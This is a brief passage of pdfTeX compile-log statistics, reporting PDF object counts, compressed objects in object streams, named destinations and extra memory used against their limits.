+ 557 PDF objects out of 1000 (max. 8388607)
+ 373 compressed objects within 4 object streams
  0 named destinations out of 1000 (max. 500000)
  13 words of extra memory for PDF output out of 10000 (max. 10000000)
 
